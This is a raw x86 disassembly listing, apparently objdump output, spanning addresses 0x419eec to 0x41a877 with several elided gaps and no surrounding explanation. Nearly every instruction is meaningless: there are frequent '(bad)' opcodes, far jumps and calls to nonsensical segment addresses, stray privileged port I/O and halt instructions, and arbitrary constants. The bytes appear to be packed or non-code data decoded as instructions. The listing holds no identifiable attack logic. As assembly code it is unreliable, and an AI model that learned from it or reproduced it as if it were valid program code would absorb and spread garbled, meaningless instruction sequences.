  419eec:	add    cl,BYTE PTR [edx+esi*2+0x4d]
  419ef0:	ret    
  419ef1:	add    eax,0x4e7a4a1f
  419ef6:	aas    
  419ef7:	(bad)  
  419ef9:	sub    esp,DWORD PTR [eax]
  419efb:	ds popf 
  419efd:	jmp    0xc0595f9
  419f02:	jb     0x419f7e
  419f04:	mov    al,0x15
  419f06:	sub    BYTE PTR [edx],cl
  419f08:	inc    ecx
  419f09:	(bad)  
  419f0a:	popa   
  419f0b:	(bad)  
  419f0d:	sbb    DWORD PTR [edi],eax
  419f0f:	mov    BYTE PTR [ebx+edi*8],bl
  419f12:	enter  0x1862,0xd9
  419f16:	xor    DWORD PTR [ebx+0x31aba9d1],ebp
  419f1c:	push   es
  419f1d:	out    dx,al
  419f1e:	mov    ds,esi
  419f20:	imul   ebx,esp,0xf
  419f23:	fidiv  DWORD PTR [ecx+0x7c]
  419f26:	cmc    
  419f27:	sub    al,0x91
  419f29:	out    0xf3,eax
  419f2b:	bound  esp,QWORD PTR [esi+0x3f68e0ed]
  419f31:	and    al,0xea
  419f33:	xor    al,0x28
  419f35:	data16 loopne 0x419ed1
  419f38:	or     DWORD PTR [esi],eax
  419f3a:	and    DWORD PTR ds:0x3c1fc510,eax
  419f40:	cmp    edx,edi
  419f42:	hlt    
  419f43:	push   ds
  419f44:	in     eax,dx
  419f45:	inc    edi
  419f46:	repnz sti 
  419f48:	clc    
  419f49:	cwde   
  419f4a:	inc    ecx
  419f4b:	pop    edi
  419f4c:	mov    eax,es:0xba34a8b9
  419f52:	imul   ebp,DWORD PTR [ebx],0x7618e1ad
  419f58:	(bad)  
  419f59:	das    
  419f5a:	sbb    al,0xf4
  419f5c:	pop    edx
  419f5d:	sbb    eax,0xf1af0345
  419f62:	lds    edx,FWORD PTR [edx]
  419f64:	scas   eax,DWORD PTR es:[edi]
  419f65:	mov    cl,0x5b
  419f67:	outs   dx,BYTE PTR ds:[esi]
  419f68:	mov    ebx,0x71e89caa
  419f6d:	and    DWORD PTR [ebx],0x14
  419f70:	nop
  419f71:	mov    ah,0x4b
  419f73:	aam    0x65
  419f75:	mov    esp,DWORD PTR [edi-0x56]
  419f78:	cmp    ebx,DWORD PTR [esi+0x7b]
  419f7b:	loope  0x419f8c
  419f7d:	(bad)  
  419f7e:	jmp    0x419fc5
  419f80:	out    0x76,al
  419f82:	jne    0x419f78
  419f84:	fmul   QWORD PTR [ecx+esi*2+0x307175ce]
  419f8b:	pop    ecx
  419f8c:	aad    0x1
  419f8e:	inc    ecx
  419f8f:	inc    eax
  419f90:	ror    BYTE PTR [edi-0x76031f1f],1
  419f96:	jb     0x41a000
  419f98:	fbld   TBYTE PTR ss:[ecx]
  419f9b:	or     al,0xce
  419f9d:	push   ecx
  419f9e:	sbb    DWORD PTR [eax+0x7ab4ac6c],0xffffff89
  419fa5:	sbb    esp,edi
  419fa7:	je     0x419f44
  419fa9:	hlt    
  419faa:	fs mov DWORD PTR gs:0xb6f704ee,ecx
  419fb2:	ja     0x41a02a
  419fb4:	cli    
	...
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	mov    ebp,0xb4c810d1
  41a027:	adc    DWORD PTR [ecx],eax
  41a029:	add    BYTE PTR [edi],al
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [edi+0x448bf993],bl
  41a033:	test   BYTE PTR [ecx-0x12934496],bh
  41a039:	push   edi
  41a03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a03b:	sub    al,0xd2
  41a03d:	xchg   ebx,eax
  41a03e:	outs   dx,BYTE PTR ds:[esi]
  41a03f:	mov    cl,0xef
  41a041:	mov    esi,0xf4649c9a
  41a046:	xor    bh,BYTE PTR [esi]
  41a048:	sbb    eax,0x22f767e4
  41a04d:	inc    esp
  41a04e:	xchg   ecx,eax
  41a04f:	shl    DWORD PTR [esi+0x539d37ab],cl
  41a055:	and    edx,DWORD PTR [edi-0x667ad19c]
  41a05b:	gs stos BYTE PTR es:[edi],al
  41a05d:	clc    
  41a05e:	rcl    DWORD PTR ds:0x775fdb,cl
  41a064:	fsub   st,st(6)
  41a066:	add    bl,BYTE PTR [esi-0x58]
  41a069:	or     DWORD PTR [ebx],esp
  41a06b:	das    
  41a06c:	scas   al,BYTE PTR es:[edi]
  41a06d:	or     ch,BYTE PTR [edi]
  41a06f:	mov    ch,0xa5
  41a071:	sbb    edi,DWORD PTR [ecx+0xa6382e3]
  41a077:	mov    ah,0xda
  41a079:	inc    esp
  41a07a:	out    dx,eax
  41a07b:	ret    
  41a07c:	cli    
  41a07d:	jl     0x41a085
  41a07f:	iret   
  41a080:	jbe    0x41a069
  41a082:	add    al,0x65
  41a084:	sub    eax,0xcc235f55
  41a089:	push   es
  41a08a:	xchg   esp,eax
  41a08b:	popa   
  41a08c:	push   0x7f
  41a08e:	or     ah,bh
  41a090:	adc    DWORD PTR [eax+0x73d03da5],ecx
  41a096:	aaa    
  41a097:	into   
  41a098:	pop    ds
  41a099:	(bad)  
  41a09a:	out    0xbc,al
  41a09c:	call   0xea4d:0xc0e43ce2
  41a0a3:	fcomp  QWORD PTR [edx+0x12]
  41a0a6:	pop    esp
  41a0a7:	or     BYTE PTR [edx-0x4c],cl
  41a0aa:	int3   
  41a0ab:	push   ebp
  41a0ac:	std    
  41a0ad:	pop    edi
  41a0ae:	pop    ebp
  41a0af:	xor    al,dl
  41a0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b2:	cmp    edi,DWORD PTR [edx+0x4d311f31]
  41a0b8:	pushf  
  41a0b9:	loopne 0x41a139
  41a0bb:	test   BYTE PTR [esi+0x1205609f],ah
  41a0c1:	push   ebx
  41a0c2:	mov    DWORD PTR [edx+0x15774cef],0x9811d646
  41a0cc:	into   
  41a0cd:	mov    ss,eax
  41a0cf:	sahf   
  41a0d0:	sub    al,0x6c
  41a0d2:	dec    esp
  41a0d3:	test   DWORD PTR [eax],0x3131e022
  41a0d9:	sbb    ax,WORD PTR [ecx-0x34]
  41a0dd:	cmp    DWORD PTR [esi],esi
  41a0df:	add    eax,0x4d0645d0
  41a0e4:	mov    bl,0x38
  41a0e6:	push   bx
  41a0e8:	repz xchg esp,eax
  41a0ea:	out    0xd7,eax
  41a0ec:	fld    TBYTE PTR [ebx-0x2baa261]
  41a0f2:	jmp    0xabf3:0x3dad580a
  41a0f9:	inc    ebp
  41a0fa:	(bad)  
  41a0fb:	sbb    DWORD PTR [ebp+edx*4+0x215b9582],edx
  41a102:	das    
  41a103:	(bad)  
  41a104:	dec    ebx
  41a105:	ins    DWORD PTR es:[edi],dx
  41a106:	mov    BYTE PTR [ebx],dl
  41a108:	sub    DWORD PTR [ebx+0x28],ebp
  41a10b:	mov    bh,0x75
  41a10d:	and    al,0x66
  41a10f:	dec    esp
  41a110:	pop    ebx
  41a111:	ret    0xb9d2
  41a114:	mov    ebx,0xd4f24408
  41a119:	stos   BYTE PTR es:[edi],al
  41a11a:	inc    esp
  41a11b:	lea    edi,[edi]
  41a11d:	or     al,0xe8
  41a11f:	lock call 0xa57b210b
  41a125:	mov    ebp,0x9547e61b
  41a12a:	daa    
  41a12b:	(bad)  
  41a12c:	pop    edx
  41a12d:	hlt    
  41a12e:	mov    al,0x51
  41a130:	das    
  41a131:	xor    esp,eax
  41a133:	stos   DWORD PTR es:[edi],eax
  41a134:	sbb    al,0x0
	...
  41a196:	sbb    al,0xc
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	dec    esp
  41a1a3:	outs   dx,DWORD PTR ds:[esi]
  41a1a4:	stos   BYTE PTR es:[edi],al
  41a1a5:	call   0x107:0x112bb
  41a1ac:	add    BYTE PTR [eax],al
  41a1ae:	lahf   
  41a1af:	repnz mov bh,0xa1
  41a1b2:	pop    ss
  41a1b3:	xor    al,0x5
  41a1b5:	mov    bl,0xb
  41a1b7:	(bad)  
  41a1b8:	cmc    
  41a1b9:	xor    al,0x30
  41a1bb:	and    bl,ah
  41a1bd:	pop    ds
  41a1be:	out    dx,eax
  41a1bf:	adc    eax,0x845e9fa9
  41a1c4:	test   eax,ebx
  41a1c6:	xchg   edi,eax
  41a1c7:	add    BYTE PTR [eax+0xd09741f],cl
  41a1cd:	mov    bh,0xcd
  41a1cf:	scas   eax,DWORD PTR es:[edi]
  41a1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d1:	mov    ah,0xea
  41a1d3:	xchg   edx,eax
  41a1d4:	fcomp  QWORD PTR [edi-0x21]
  41a1d7:	sub    al,0xd6
  41a1d9:	call   0x274c:0xf419ad2b
  41a1e0:	mov    ds:0x9a03fa15,al
  41a1e5:	mov    al,0x4a
  41a1e7:	not    BYTE PTR [esi+0x36]
  41a1ea:	cmp    DWORD PTR [eax],eax
  41a1ec:	inc    esp
  41a1ed:	and    cl,0xc4
  41a1f0:	xchg   edx,eax
  41a1f1:	inc    edx
  41a1f2:	popa   
  41a1f3:	dec    ebx
  41a1f4:	test   ah,0x96
  41a1f7:	shl    edx,cl
  41a1f9:	sub    al,0x5
  41a1fb:	icebp  
  41a1fc:	mov    cl,BYTE PTR [ebx]
  41a1fe:	retf   0xf316
  41a201:	mov    cl,0xe3
  41a203:	test   al,0x38
  41a205:	fwait
  41a206:	dec    eax
  41a207:	imul   edi,DWORD PTR [edx+0x63eb0b7a],0x19
  41a20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a20f:	adc    BYTE PTR [edx],dl
  41a211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a212:	xchg   esi,eax
  41a213:	ja     0x41a240
  41a215:	div    BYTE PTR [edi]
  41a217:	in     eax,0x80
  41a219:	mov    dh,0x71
  41a21b:	mov    ds:0x5a96ccb3,al
  41a220:	mov    edx,0x315b887c
  41a225:	jae    0x41a206
  41a227:	sbb    al,0xc1
  41a229:	loopne 0x41a27d
  41a22b:	icebp  
  41a22c:	xor    ah,ah
  41a22e:	lahf   
  41a22f:	xchg   DWORD PTR [ebp-0x1d0223bd],ecx
  41a235:	sbb    al,0xc3
  41a237:	inc    esp
  41a238:	inc    ebp
  41a239:	adc    BYTE PTR ds:0xc1b321e5,dh
  41a23f:	cmp    DWORD PTR [eax+eiz*8-0x17],ebp
  41a243:	add    al,0x69
  41a245:	mov    dh,0xd2
  41a247:	mov    ds:0xafd8f605,al
  41a24c:	xor    esi,DWORD PTR [esp+edi*4+0x1]
  41a250:	ret    
  41a251:	add    BYTE PTR [esi],0xa0
  41a254:	xchg   edx,eax
  41a255:	jbe    0x41a29f
  41a257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a258:	out    dx,al
  41a259:	push   ebp
  41a25a:	push   eax
  41a25b:	or     DWORD PTR [ecx-0x55ffc32b],eax
  41a261:	add    BYTE PTR [ecx],dl
  41a263:	add    BYTE PTR [ebp+eiz*8+0x0],ch
  41a267:	nop
  41a268:	hlt    
  41a269:	push   edx
  41a26a:	out    dx,al
  41a26b:	dec    ebp
  41a26c:	(bad)  
  41a26d:	shl    DWORD PTR [esi+0x24],1
  41a270:	xor    dh,BYTE PTR [eax+0x21]
  41a273:	xchg   ebx,eax
  41a274:	test   al,0x32
  41a276:	adc    edi,DWORD PTR [edx-0x8]
  41a279:	sub    eax,0xfb3e3e89
  41a27e:	push   ebx
  41a27f:	stos   BYTE PTR es:[edi],al
  41a280:	or     esp,DWORD PTR [ecx-0x11d13a52]
  41a286:	dec    ecx
  41a287:	pop    edi
  41a288:	test   DWORD PTR [ecx-0x61],esi
  41a28b:	scas   al,BYTE PTR es:[edi]
  41a28c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28d:	push   ebp
  41a28e:	stos   DWORD PTR es:[edi],eax
  41a28f:	shl    DWORD PTR [eax-0x35ed07b7],cl
  41a295:	cmp    edi,DWORD PTR [ebp+0x1828672f]
  41a29b:	sub    eax,0x9a714013
  41a2a0:	(bad)  
  41a2a1:	push   esi
  41a2a2:	push   eax
  41a2a3:	pop    ebp
  41a2a4:	scas   al,BYTE PTR es:[edi]
  41a2a5:	ss fs and al,0xb5
  41a2a9:	ret    
  41a2aa:	mov    esi,0x7999061c
  41a2af:	ror    BYTE PTR [ebx],cl
  41a2b1:	jp     0x41a252
  41a2b3:	inc    edx
  41a2b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax-0x6fe10226],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR ds:0x41cee7c0,ah
  41a333:	cli    
  41a334:	call   0x4605badf
  41a339:	jbe    0x41a378
  41a33b:	push   ecx
  41a33c:	(bad)
  41a340:	xor    DWORD PTR [ebx+0x17f867a6],edx
  41a346:	inc    edx
  41a347:	popf   
  41a348:	xchg   edx,eax
  41a349:	or     eax,0x421f4639
  41a34e:	add    BYTE PTR [ebx],dl
  41a350:	(bad)  
  41a352:	sbb    eax,DWORD PTR [edx]
  41a354:	inc    eax
  41a355:	push   esi
  41a356:	ror    BYTE PTR [ebp+edx*4+0x20],0xb4
  41a35b:	inc    eax
  41a35c:	jbe    0x41a32a
  41a35e:	ror    BYTE PTR [edx+0x78833cd9],cl
  41a364:	test   ah,ah
  41a366:	out    0x37,eax
  41a368:	mov    ah,0x37
  41a36a:	sub    al,0xf1
  41a36c:	or     DWORD PTR [edx+0x4c7ac171],esp
  41a372:	mov    al,ds:0xbec77afc
  41a377:	dec    edx
  41a378:	(bad)  
  41a379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a37a:	lahf   
  41a37b:	outs   dx,BYTE PTR ds:[esi]
  41a37c:	test   eax,0x116671af
  41a381:	or     eax,0xc6f8351f
  41a386:	ja     0x41a3bb
  41a388:	jns    0x41a36b
  41a38a:	and    eax,0xc0a43638
  41a38f:	cmp    al,0xf4
  41a391:	(bad)  
  41a392:	push   edx
  41a393:	dec    ebx
  41a394:	push   0xfffffff4
  41a396:	dec    ebp
  41a397:	(bad)  
  41a398:	clc    
  41a399:	out    dx,eax
  41a39a:	das    
  41a39b:	jg     0x41a338
  41a39d:	or     eax,0x9c3c4963
  41a3a2:	in     eax,0xe8
  41a3a4:	inc    cx
  41a3a6:	stos   BYTE PTR es:[edi],al
  41a3a7:	mov    al,0x7b
  41a3a9:	xchg   edx,eax
  41a3aa:	clc    
  41a3ab:	mov    al,BYTE PTR [esi-0x3f]
  41a3ae:	es (bad) 
  41a3b0:	hlt    
  41a3b1:	jmp    0x52a9:0xc6282e8a
  41a3b8:	lods   eax,DWORD PTR ds:[esi]
  41a3b9:	xor    eax,0xc753152c
  41a3be:	lahf   
  41a3bf:	in     eax,0x8b
  41a3c1:	mov    ebp,0xa6c7cb1f
  41a3c6:	adc    al,0x71
  41a3c8:	sti    
  41a3c9:	shr    BYTE PTR [esi+eiz*4],1
  41a3cc:	sbb    ecx,DWORD PTR [ecx-0x2d]
  41a3cf:	lods   al,BYTE PTR ds:[esi]
  41a3d0:	sbb    eax,0xc85cb89c
  41a3d5:	jecxz  0x41a381
  41a3d7:	sbb    ebx,eax
  41a3d9:	je     0x41a41b
  41a3db:	xchg   esp,eax
  41a3dc:	icebp  
  41a3dd:	dec    esi
  41a3de:	mov    al,0x1c
  41a3e0:	inc    esp
  41a3e1:	push   esp
  41a3e2:	ds inc ebx
  41a3e4:	retf   
  41a3e5:	ret    
  41a3e6:	mov    ss,WORD PTR [edx+ebp*1]
  41a3e9:	imul   esi,ebp,0x2fe4ed97
  41a3ef:	sti    
  41a3f0:	stc    
  41a3f1:	mov    dh,0x72
  41a3f3:	or     BYTE PTR [edx-0x4d],cl
  41a3f6:	inc    edi
  41a3f7:	into   
  41a3f8:	std    
  41a3f9:	daa    
  41a3fa:	cld    
  41a3fb:	retf   
  41a3fc:	adc    DWORD PTR [eax-0x19],ebx
  41a3ff:	jb     0x41a3a5
  41a401:	dec    edi
  41a402:	push   ss
  41a403:	inc    ecx
  41a404:	push   esi
  41a405:	xor    ch,BYTE PTR [edx]
  41a407:	xor    eax,0x5ed96e89
  41a40c:	lahf   
  41a40d:	and    DWORD PTR [ecx+0x7f],edx
  41a410:	or     BYTE PTR [edx],0x35
  41a413:	loop   0x41a490
  41a415:	aam    0x8
  41a417:	repnz pop edi
  41a419:	mov    edi,0xb7bde960
  41a41e:	sahf   
  41a41f:	pop    ss
  41a420:	xchg   ecx,eax
  41a421:	dec    edx
  41a422:	sbb    ch,al
  41a424:	adc    al,0xb9
  41a426:	jno    0x41a478
  41a428:	pop    ds
  41a429:	pop    ds
  41a42a:	es cli 
  41a42c:	fnstcw WORD PTR [ebp-0x4fa0a478]
  41a432:	(bad)  [eax+0xd5]
	...
  41a494:	add    BYTE PTR [eax],al
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	iret   
  41a4a3:	out    0x7d,al
  41a4a5:	pop    ecx
  41a4a6:	leave  
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [edx+0x74],dl
  41a4b0:	add    ebp,eax
  41a4b2:	xor    al,0x62
  41a4b4:	mov    eax,ds:0x76369df6
  41a4b9:	cmp    eax,0x73540026
  41a4be:	(bad)  [ecx]
  41a4c0:	jge    0x41a518
  41a4c2:	xor    bl,BYTE PTR [ebp+0x37]
  41a4c5:	jb     0x41a491
  41a4c7:	push   0xf1b149a0
  41a4cc:	mov    dh,0x1c
  41a4ce:	jmp    FWORD PTR [esi+ecx*1-0x4f08fcf7]
  41a4d5:	pop    esp
  41a4d6:	cmp    DWORD PTR [edi],edi
  41a4d8:	fld    QWORD PTR [edx]
  41a4da:	cmp    eax,0x8aeb02b
  41a4df:	jp     0x41a4c9
  41a4e1:	push   ebp
  41a4e2:	stos   BYTE PTR es:[edi],al
  41a4e3:	xchg   edi,eax
  41a4e4:	mov    eax,0x22b68b70
  41a4e9:	popa   
  41a4ea:	mov    dh,BYTE PTR [ebp+0x6d]
  41a4ed:	sub    DWORD PTR [ecx-0x76126b8e],edi
  41a4f3:	xchg   ebx,eax
  41a4f4:	sbb    al,0xa6
  41a4f6:	push   cs
  41a4f7:	push   ebp
  41a4f8:	shl    BYTE PTR [edi],0x3b
  41a4fb:	bound  esp,QWORD PTR [edi]
  41a4fd:	inc    edi
  41a4fe:	mov    eax,es
  41a500:	call   0xc6e559e1
  41a505:	push   edx
  41a506:	hlt    
  41a507:	shr    DWORD PTR [edx+0x7b],1
  41a50a:	sahf   
  41a50b:	add    dl,BYTE PTR [edx-0x16]
  41a50e:	pop    edi
  41a50f:	mov    edx,0xcd40f417
  41a514:	mov    bl,0x92
  41a516:	mov    ch,0xdb
  41a518:	adc    DWORD PTR [bp+0xb],0x3d00aeff
  41a520:	push   es
  41a521:	mov    ch,BYTE PTR [edx-0x1f577b20]
  41a527:	dec    esi
  41a528:	sar    DWORD PTR [ecx+0x2],0x97
  41a52c:	jp     0x41a53f
  41a52e:	and    BYTE PTR [ebx+0x12],ch
  41a531:	sti    
  41a532:	xchg   ecx,eax
  41a533:	hlt    
  41a534:	mov    al,ds:0x201a50de
  41a539:	jge    0x41a562
  41a53b:	xor    BYTE PTR [edx-0x6bfe73fe],dh
  41a541:	add    cl,BYTE PTR [edi+edi*8+0x5325a749]
  41a548:	mov    ds:0xda4979a7,al
  41a54d:	xor    BYTE PTR [esi+0x21223d4b],bl
  41a553:	sub    BYTE PTR [ebx+esi*2-0x4b5fa2d7],0x6f
  41a55b:	cmc    
  41a55c:	cs cmc 
  41a55e:	popf   
  41a55f:	repnz or dl,BYTE PTR fs:[ecx+ecx*8]
  41a564:	jbe    0x41a52b
  41a566:	aas    
  41a567:	aas    
  41a568:	or     eax,0xcd6c5678
  41a56d:	xchg   edx,eax
  41a56e:	or     al,0x15
  41a570:	and    BYTE PTR [edx],dl
  41a572:	xchg   edi,eax
  41a573:	pop    ss
  41a574:	jbe    0x41a5c2
  41a576:	mov    dh,0x1b
  41a578:	stos   DWORD PTR es:[edi],eax
  41a579:	mov    ecx,0x93c0ae6b
  41a57e:	fld    TBYTE PTR [ebp-0x599e87e4]
  41a584:	scas   eax,DWORD PTR es:[edi]
  41a585:	loop   0x41a5e4
  41a587:	push   ecx
  41a588:	xor    cl,BYTE PTR [ecx+0x68f8ce3c]
  41a58e:	and    eax,0xee8f5fcc
  41a593:	int    0xcd
  41a595:	mov    eax,0x97735be5
  41a59a:	adc    edx,DWORD PTR [ecx+0xb406116]
  41a5a0:	xchg   ebx,eax
  41a5a1:	xchg   edi,eax
  41a5a2:	mov    ecx,0x427ffddd
  41a5a7:	sbb    DWORD PTR [edi+0x20a3b5d1],esi
  41a5ad:	cmp    DWORD PTR [eax+0x57a245a9],edi
  41a5b3:	lods   al,BYTE PTR ds:[esi]
  41a5b4:	jo     0x41a5b6
	...
  41a616:	pop    esp
  41a617:	sub    al,BYTE PTR [ecx]
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x16775949
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	sbb    BYTE PTR [ebp+0x3acb15f6],dl
  41a634:	cmp    BYTE PTR [ecx+0x43],cl
  41a637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a638:	pop    eax
  41a639:	cdq    
  41a63a:	hlt    
  41a63b:	loopne 0x41a5cc
  41a63d:	outs   dx,BYTE PTR ds:[esi]
  41a63e:	jno    0x41a6a8
  41a640:	pop    ebp
  41a641:	mov    dh,0x40
  41a643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a644:	mov    bh,0xe3
  41a646:	imul   BYTE PTR [edx]
  41a648:	(bad)  
  41a649:	cmp    edx,esp
  41a64b:	mov    esp,ecx
  41a64d:	cmp    cl,ch
  41a64f:	mov    ah,0xc1
  41a651:	cmp    dl,BYTE PTR [ecx]
  41a653:	stos   BYTE PTR es:[edi],al
  41a654:	aam    0xca
  41a656:	iret   
  41a657:	mov    bh,0x84
  41a659:	push   ecx
  41a65a:	sub    al,0x5
  41a65c:	fwait
  41a65d:	mov    edi,0x917a0314
  41a662:	outs   dx,DWORD PTR ds:[esi]
  41a663:	fsubr  QWORD PTR [edx-0x10]
  41a666:	adc    BYTE PTR [edx-0x6f23e956],al
  41a66c:	lods   al,BYTE PTR ds:[esi]
  41a66d:	stc    
  41a66e:	test   al,0xb1
  41a670:	ds aad 0xed
  41a673:	retf   
  41a674:	fadd   QWORD PTR [ecx]
  41a676:	add    esp,DWORD PTR ds:0x9913eb66
  41a67c:	es retf 
  41a67e:	inc    esi
  41a67f:	shl    DWORD PTR [edx+ebx*8-0x73],0x8c
  41a684:	pop    ebx
  41a685:	popa   
  41a686:	mov    ds:0xa07aaf70,eax
  41a68b:	daa    
  41a68c:	add    BYTE PTR [edi],dl
  41a68e:	fnstcw WORD PTR [eax+0x403d0ec3]
  41a694:	mov    dh,0x91
  41a696:	rol    ch,0x3d
  41a699:	int3   
  41a69a:	cwde   
  41a69b:	push   0x1ab75a38
  41a6a0:	adc    ah,BYTE PTR [ecx+ebx*4]
  41a6a3:	sub    esp,DWORD PTR [ebp+0x4f]
  41a6a6:	scas   al,BYTE PTR es:[edi]
  41a6a7:	push   ebx
  41a6a8:	adc    bh,BYTE PTR [edi+0x5]
  41a6ab:	mov    eax,ds:0x8f981015
  41a6b0:	jmp    0xeee7:0xcdb65a34
  41a6b7:	xor    DWORD PTR [ebx+0x49],0x3b
  41a6bb:	sbb    BYTE PTR [ecx-0x4477c92b],dh
  41a6c1:	mov    esp,0xab8b924e
  41a6c6:	sub    BYTE PTR [esi*4-0x283eead5],dh
  41a6cd:	and    eax,0x6cf2acd
  41a6d2:	mov    WORD PTR ds:0x84c6f672,fs
  41a6d8:	je     0x41a6db
  41a6da:	and    BYTE PTR [ecx-0x1c3e4d16],0x48
  41a6e1:	xchg   esi,eax
  41a6e2:	fld    DWORD PTR [eax-0x4eabf872]
  41a6e8:	jns    0x41a6a1
  41a6ea:	adc    al,0x6c
  41a6ec:	(bad)  
  41a6ed:	call   0x19bf940e
  41a6f2:	(bad)  
  41a6f3:	cli    
  41a6f4:	dec    esi
  41a6f5:	add    ebp,DWORD PTR [ecx]
  41a6f7:	mov    ebx,DWORD PTR [eax+0x61]
  41a6fa:	les    edx,FWORD PTR [ebx-0x558c8e1a]
  41a700:	mov    gs,WORD PTR [ecx-0x210787c8]
  41a706:	mov    WORD PTR [eax],ss
  41a708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a709:	and    eax,0xb0f5d7df
  41a70e:	push   ebp
  41a70f:	sbb    BYTE PTR [edi+0x7886b69d],bl
  41a715:	mov    bl,0xf7
  41a717:	inc    edx
  41a718:	das    
  41a719:	pop    esp
  41a71a:	out    dx,eax
  41a71b:	imul   edi,DWORD PTR [eax+0xa],0xffffff89
  41a71f:	in     al,0xa7
  41a721:	mov    BYTE PTR [ecx+0x56],0xd1
  41a725:	ins    DWORD PTR es:[edi],dx
  41a726:	xor    ebp,DWORD PTR [ecx+0x296c45ed]
  41a72c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a72d:	sub    dh,BYTE PTR [edx-0x18]
  41a730:	mov    ds:0x933fb9ed,al
	...
  41a795:	add    bl,dh
  41a797:	xchg   edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx+0x211050a8]
  41a7a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7a5:	(bad)  
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [ecx+0x6b],bl
  41a7b0:	or     eax,0xcf13d13e
  41a7b5:	pop    ebp
  41a7b6:	cmp    ecx,DWORD PTR [edx+ebx*8+0x7e03503f]
  41a7bd:	push   ecx
  41a7be:	dec    esp
  41a7bf:	dec    ecx
  41a7c0:	(bad)  
  41a7c1:	stos   DWORD PTR es:[edi],eax
  41a7c2:	in     eax,dx
  41a7c3:	fsubr  QWORD PTR [edi-0x7c1592a3]
  41a7c9:	and    cl,dl
  41a7cb:	mov    ds:0x1391c34a,al
  41a7d0:	(bad)  
  41a7d1:	mov    WORD PTR es:[edi-0x70],ds
  41a7d5:	sub    DWORD PTR [edi+0xa],esp
  41a7d8:	push   0xfffffffe
  41a7da:	cmc    
  41a7db:	cmp    eax,0x618026fb
  41a7e0:	pop    ecx
  41a7e1:	in     al,0xc3
  41a7e3:	xchg   edx,eax
  41a7e4:	pop    esp
  41a7e5:	push   0x7cd0069a
  41a7ea:	xlat   BYTE PTR ds:[ebx]
  41a7eb:	pop    eax
  41a7ec:	mov    ah,0x70
  41a7ee:	xchg   ecx,eax
  41a7ef:	or     eax,0xdd2629b8
  41a7f4:	gs sahf 
  41a7f6:	mov    ecx,0xd58025ef
  41a7fb:	sar    BYTE PTR [edi-0x42],1
  41a7fe:	adc    eax,0xcf74b4b5
  41a803:	imul   ebp,DWORD PTR [eax+0x1a],0x8ebf8e
  41a80a:	retf   
  41a80b:	push   edx
  41a80c:	inc    edi
  41a80d:	push   ss
  41a80e:	popa   
  41a80f:	in     al,0xf9
  41a811:	fsub   QWORD PTR [eax+0x6b]
  41a814:	and    eax,0x79a86272
  41a819:	jbe    0x41a850
  41a81b:	jbe    0x41a7e0
  41a81d:	inc    edx
  41a81e:	jns    0x41a7d2
  41a820:	int3   
  41a821:	mov    ch,0xe2
  41a823:	jecxz  0x41a7d8
  41a825:	into   
  41a826:	jns    0x41a895
  41a828:	xor    eax,0x424fb920
  41a82d:	fistp  WORD PTR [ebp-0x3510ff2b]
  41a833:	leave  
  41a834:	inc    eax
  41a835:	or     BYTE PTR [edx-0x4b744fff],al
  41a83b:	sub    BYTE PTR [ecx-0x38],bh
  41a83e:	mov    edx,0x48243a5b
  41a843:	adc    BYTE PTR [edi+edx*4],ch
  41a846:	pop    edx
  41a847:	sbb    bl,BYTE PTR [ebx]
  41a849:	mov    ds:0xac87182,eax
  41a84e:	enter  0xe817,0xa8
  41a852:	stos   DWORD PTR es:[edi],eax
  41a853:	and    DWORD PTR [ebx],ebp
  41a855:	jb     0x41a802
  41a857:	jbe    0x41a87a
  41a859:	shr    BYTE PTR [eax+0x526c0dc9],1
  41a85f:	rcr    DWORD PTR [ecx],1
  41a861:	and    esp,eax
  41a863:	pop    ecx
  41a864:	jb     0x41a87c
  41a866:	(bad)  
  41a867:	in     al,0x12
  41a869:	xor    DWORD PTR [eax+esi*8+0x68efacbe],edx
  41a870:	shl    DWORD PTR [ebp-0x361bde67],0xce
  41a877:	fild   QWORD PTR [ebp-0x1b47a439]
